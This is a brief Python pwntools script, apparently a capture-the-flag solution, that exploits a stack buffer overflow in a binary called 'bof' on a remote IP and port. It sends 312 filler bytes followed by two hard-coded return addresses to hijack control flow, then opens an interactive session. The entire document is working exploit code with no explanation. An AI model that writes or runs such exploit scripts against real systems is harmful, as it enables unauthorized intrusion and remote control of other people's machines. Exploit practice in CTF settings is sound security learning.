from pwn import *

r = remote("34.141.71.230",32591)
#r = process("./bof")

payload = b"a"*312
payload += p64(0x00000000004005de)
payload += p64(0x0000000000400767)

r.recv()
r.sendline(payload)
r.interactive()
#print(r.recv())
